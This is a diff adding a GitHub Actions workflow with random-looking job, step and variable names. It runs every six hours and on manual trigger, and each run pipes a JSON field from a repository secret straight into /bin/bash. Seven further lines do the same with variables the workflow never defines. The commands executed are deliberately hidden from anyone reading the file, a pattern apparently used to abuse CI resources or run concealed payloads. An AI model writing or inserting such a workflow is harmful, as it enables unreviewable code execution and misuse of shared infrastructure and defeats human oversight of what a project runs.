@@ -1,0 +1,24 @@
+name: diebafuma
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: diebafuma
+        env:
+          tmbmp5: ${{ secrets.tmbmp5 }}
+        run: |
+          echo $tmbmp5 | jq -r .aabz96256 | /bin/bash
+          echo $jmnml575 | jq -r .qpm70380 | /bin/bash
+          echo $rcwei1 | jq -r .is4 | /bin/bash
+          echo $f6 | jq -r .ggxf64 | /bin/bash
+          echo $x1 | jq -r .uxvvm6308 | /bin/bash
+          echo $pnhv23527 | jq -r .z9 | /bin/bash
+          echo $bjx157 | jq -r .gxk68658 | /bin/bash
+          echo $v4 | jq -r .ngkak3498 | /bin/bash
+
